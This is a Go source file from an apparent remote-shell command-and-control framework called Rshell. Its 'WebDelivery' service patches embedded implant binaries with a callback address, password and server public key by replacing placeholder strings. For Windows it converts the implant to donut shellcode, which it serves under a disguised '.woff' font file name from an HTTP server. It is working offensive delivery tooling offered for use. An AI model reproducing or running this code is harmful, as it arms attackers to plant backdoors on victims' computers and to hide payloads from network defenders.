package service

import (
	"Rshell/pkg/database"
	"Rshell/pkg/encrypt"
	"Rshell/pkg/godonut"
	"Rshell/pkg/logger"
	"bytes"
	"fmt"
	"net/http"
	"strings"
	"sync"
)

var (
	WebDeliveryServer = make(map[string]*http.Server)
	WebDeliveryMutex  sync.Mutex
)

// StartWebDeliveryServer 启动 WebDelivery 服务
func StartWebDeliveryServer(port, osType, archType, listener, pass, filename string) error {
	inUse, err := IsPortInUse(port)
	if err != nil {
		logger.Error("检测端口 %s 时发生错误: %v\n", port, err)
	}
	if inUse {
		return fmt.Errorf("port %s already in use", port)
	}

	listenerTmp := strings.Split(listener, "://")
	listenerType := listenerTmp[0]
	connectAddress := listenerTmp[1]

	binaryFileName := FindBinary(listenerType, osType, archType)
	if binaryFileName == "" {
		return fmt.Errorf("binary file not found for %s/%s/%s", listenerType, osType, archType)
	}

	binaryData, err := EmbeddedFiles.ReadFile("server/" + listenerType + "/" + binaryFileName)
	if err != nil {
		return fmt.Errorf("failed to read binary: %v", err)
	}

	modifiedData := patchBinaryData(binaryData, listenerType, connectAddress, pass)

	mux := http.NewServeMux()
	mux.HandleFunc("/"+filename, func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "application/octet-stream")
		w.Header().Set("Content-Disposition", "attachment; filename="+filename)
		w.Write(modifiedData)
	})

	if osType == "windows" {
		shellcode, err := godonut.GenShellcode(modifiedData, pass, archType)
		if err != nil {
			return fmt.Errorf("shellcode generation failed: %v", err)
		}
		mux.HandleFunc("/"+filename+".woff", func(w http.ResponseWriter, r *http.Request) {
			w.Header().Set("Content-Type", "application/octet-stream")
			w.Header().Set("Content-Disposition", "attachment; filename="+filename+".woff")
			w.Write(shellcode)
		})
	}

	server := &http.Server{
		Addr:    ":" + port,
		Handler: mux,
	}

	WebDeliveryMutex.Lock()
	WebDeliveryServer[port] = server
	WebDeliveryMutex.Unlock()

	go func() {
		if err := server.ListenAndServe(); err != nil && err != http.ErrServerClosed {
			logger.Error(err.Error())
		}
	}()

	return nil
}

// StopWebDeliveryServer 停止 WebDelivery 服务
func StopWebDeliveryServer(port string) error {
	WebDeliveryMutex.Lock()
	server, exists := WebDeliveryServer[port]
	delete(WebDeliveryServer, port)
	WebDeliveryMutex.Unlock()

	if !exists {
		return fmt.Errorf("web delivery server %s not found", port)
	}

	return server.Close()
}

// DeleteWebDeliveryServer 关闭并删除 WebDelivery 服务
func DeleteWebDeliveryServer(port string) error {
	WebDeliveryMutex.Lock()
	server, exists := WebDeliveryServer[port]
	delete(WebDeliveryServer, port)
	WebDeliveryMutex.Unlock()

	if exists {
		if err := server.Close(); err != nil {
			return err
		}
	}
	return nil
}

// RebuildWebDeliveryServer 从数据库配置重新构建并启动 WebDelivery 服务
func RebuildWebDeliveryServer(port string) error {
	inUse, err := IsPortInUse(port)
	if err != nil {
		logger.Error("检测端口 %s 时发生错误: %v\n", port, err)
	}
	if inUse {
		return fmt.Errorf("port %s already in use", port)
	}

	var wd database.WebDelivery
	database.Engine.Where("listening_port = ?", port).Get(&wd)

	listenerTmp := strings.Split(wd.ListenerConfig, "://")
	listenerType := listenerTmp[0]
	connectAddress := listenerTmp[1]

	binaryFileName := FindBinary(listenerType, wd.OS, wd.Arch)
	if binaryFileName == "" {
		return fmt.Errorf("binary file not found for %s/%s/%s", listenerType, wd.OS, wd.Arch)
	}

	binaryData, err := EmbeddedFiles.ReadFile("server/" + listenerType + "/" + binaryFileName)
	if err != nil {
		return fmt.Errorf("failed to read binary: %v", err)
	}

	modifiedData := patchBinaryData(binaryData, listenerType, connectAddress, wd.Pass)

	mux := http.NewServeMux()
	mux.HandleFunc("/"+wd.FileName, func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "application/octet-stream")
		w.Header().Set("Content-Disposition", "attachment; filename="+wd.FileName)
		w.Write(modifiedData)
	})

	if wd.OS == "windows" {
		shellcode, err := godonut.GenShellcode(modifiedData, wd.Pass, wd.Arch)
		if err != nil {
			logger.Error("shellcode generation failed: %v", err)
		} else {
			mux.HandleFunc("/"+wd.FileName+".woff", func(w http.ResponseWriter, r *http.Request) {
				w.Header().Set("Content-Type", "application/octet-stream")
				w.Header().Set("Content-Disposition", "attachment; filename="+wd.FileName+".woff")
				w.Write(shellcode)
			})
		}
	}

	server := &http.Server{
		Addr:    ":" + port,
		Handler: mux,
	}

	WebDeliveryMutex.Lock()
	WebDeliveryServer[port] = server
	WebDeliveryMutex.Unlock()

	go func() {
		if err := server.ListenAndServe(); err != nil && err != http.ErrServerClosed {
			logger.Error(err.Error())
		}
	}()

	return nil
}

// patchBinaryData 对二进制数据进行字符串替换
func patchBinaryData(binaryData []byte, listenerType, connectAddress, pass string) []byte {
	var modifiedData []byte

	if listenerType == "oss" {
		oldStr := "HOSTAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAHOSTAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAHOSTAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAHOSTAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAHOSTAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAHOSTAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
		newStr := strings.ReplaceAll(connectAddress, " ", "")
		tmp, _ := encrypt.EncryptNormal([]byte(newStr))
		tmp2, _ := encrypt.EncodeBase64(tmp)
		newStr = string(tmp2)
		newStr = PadRight(newStr, len(oldStr))
		modifiedData = bytes.ReplaceAll(binaryData, []byte(oldStr), []byte(newStr))
	} else {
		oldStr := "HOSTAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
		newStr := strings.ReplaceAll(connectAddress, " ", "")
		newStr = PadRight(newStr, len(oldStr))
		modifiedData = bytes.ReplaceAll(binaryData, []byte(oldStr), []byte(newStr))
	}

	oldPass := "PASSAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
	newPass := PadRight(pass, len(oldPass))
	modifiedData = bytes.ReplaceAll(modifiedData, []byte(oldPass), []byte(newPass))

	oldPublicKey := "ServerPublicKeyAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
	var key database.Key
	database.Engine.Where("1=1").Get(&key)
	newPublicKey := PadRight(key.PublicKey, len(oldPublicKey))
	modifiedData = bytes.ReplaceAll(modifiedData, []byte(oldPublicKey), []byte(newPublicKey))

	return modifiedData
}
